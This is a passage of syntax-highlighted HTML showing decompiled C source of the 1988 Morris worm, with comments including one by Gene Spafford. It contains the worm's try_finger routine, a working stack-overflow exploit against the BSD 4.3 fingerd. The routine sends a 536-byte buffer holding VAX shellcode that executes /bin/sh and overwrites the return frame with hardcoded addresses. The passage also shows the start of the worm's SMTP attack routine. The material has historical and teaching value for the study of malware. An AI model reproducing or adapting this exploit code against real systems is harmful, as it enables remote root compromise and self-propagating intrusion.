        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* This doesn't appear to be used anywhere??? */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">movstr</span><span class="sc10">(</span><span class="sc11">arg0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg1</span><span class="sc10">)</span><span class="sc0">         </span><span class="sc1">/* 0x4958,&lt;just_return+
230&gt; */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">arg1</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arg0</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc0"> </span><span class="sc11">isspace</span><span class="sc10">(*</span><span class="sc11">arg0</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc11">arg0</span><span class="sc10">++;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">arg0</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">arg0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isspace</span><span class="sc10">(*</span><span class="sc11">arg0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">arg1</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">arg0</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">arg1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">arg0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* 
From Gene Spafford &lt;spaf@perdue.edu&gt;
What this routine does is actually kind of clever.  Keep in
mind that on a Vax the stack grows downwards.

fingerd gets its input via a call to gets, with an argument
of an automatic variable on the stack.  Since gets doesn't
have a bound on its input, it is possible to overflow the
buffer without an error message.  Normally, when that happens
you trash the return stack frame.  However, if you know
where everything is on the stack (as is the case with a
distributed binary like BSD), you can put selected values
back in the return stack frame.

This is what that routine does.  It overwrites the return frame
to point into the buffer that just got trashed.  The new code
does a chmk (change-mode-to-kernel) with the service call for
execl and an argument of "/bin/sh".  Thus, fingerd gets a
service request, forks a child process, tries to get a user name
and has its buffer trashed, does a return, exec's a shell,
and then proceeds to take input off the socket -- from the
worm on the other machine.  Since many sites never bother to
fix fingerd to run as something other than root.....

Luckily, the code doesn't work on Suns -- it just causes it
to dump core.

--spaf

*/</span><span class="sc0">    

</span><span class="sc1">/* This routine exploits a fixed 512 byte input buffer in a VAX running
 * the BSD 4.3 fingerd binary.  It send 536 bytes (plus a newline) to
 * overwrite six extra words in the stack frame, including the return
 * PC, to point into the middle of the string sent over.  The instructions
 * in the string do the direct system call version of execve("/bin/sh"). */</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">try_finger</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd2</span><span class="sc10">)</span><span class="sc0">       </span><span class="sc1">/* 0x49ec,&lt;just_return+378 */</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fd2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 36 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">unused</span><span class="sc10">[</span><span class="sc4">492</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l552</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l556</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l560</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l564</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l568</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">536</span><span class="sc10">];</span><span class="sc0">              </span><span class="sc1">/* 1084 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">save_sighand</span><span class="sc10">)();</span><span class="sc0">          </span><span class="sc1">/* 1088 */</span><span class="sc0">

    </span><span class="sc11">save_sighand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">justreturn</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 416,608 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 600 */</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPORT_FINGER</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 978 */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">536</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">            </span><span class="sc1">/* 628,654 */</span><span class="sc0">
    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">400</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">28</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">];</span><span class="sc0">       
    </span><span class="sc1">/* constant string x200a0 */</span><span class="sc0">

    </span><span class="sc1">/* 0xdd8f2f73,0x6800dd8f,0x2f62696e,0xd05e5add,0x00dd00dd,0x5add03d0,0x5e5cbc3b */</span><span class="sc0">
    </span><span class="sc1">/* "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"... */</span><span class="sc0">

    </span><span class="sc11">l556</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x7fffe9fc</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/* Rewrite part of the stack frame */</span><span class="sc0">
    </span><span class="sc11">l560</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x7fffe8a8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">l564</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x7fffe8bc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">l568</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x28000000</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">l552</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0001c020</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef sun
</span><span class="sc0">    </span><span class="sc11">l556</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">byte_swap</span><span class="sc10">(</span><span class="sc11">l556</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc1">/* Reverse the word order for the */</span><span class="sc0">
    </span><span class="sc11">l560</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">byte_swap</span><span class="sc10">(</span><span class="sc11">l560</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc1">/* VAX (only Suns have to do this) */</span><span class="sc0">
    </span><span class="sc11">l564</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">byte_swap</span><span class="sc10">(</span><span class="sc11">l564</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">l568</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">byte_swap</span><span class="sc10">(</span><span class="sc11">l568</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">l552</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">byte_swap</span><span class="sc10">(</span><span class="sc11">l552</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif sun
</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">         </span><span class="sc1">/* sizeof == 536 */</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">test_connection</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">fd1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">fd2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">byte_swap</span><span class="sc10">(</span><span class="sc11">arg</span><span class="sc10">)</span><span class="sc0">           </span><span class="sc1">/* 0x4c48,&lt;just_return+982 */</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">arg</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">arg</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">arg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">arg</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">permute</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">         </span><span class="sc1">/* 0x4c9a */</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newloc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">*</span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    </span><span class="sc1">/* 18,158 */</span><span class="sc0">
    </span><span class="sc11">newloc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">bcopy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">bcopy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">newloc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">bcopy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">newloc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* Called from try_rsh_and_mail() */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">try_mail</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc1">/* x4d3c &lt;permute+162&gt;*/</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">l548</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">old_handler</span><span class="sc10">)();</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc11">saddr</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc1">/* Not right */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd_tmp</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* ???  part of saddr *
/
    
    if (makemagic(host, &amp;saddr) == 0)
    return 0;               /* &lt;permute+1054&gt; */</span><span class="sc0">
    </span><span class="sc11">old_handler</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">justreturn</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* to 430 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* to 422 */</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* to 422 */</span><span class="sc0">
    
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">       </span><span class="sc1">/* 16 */</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPORT_SMTP</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
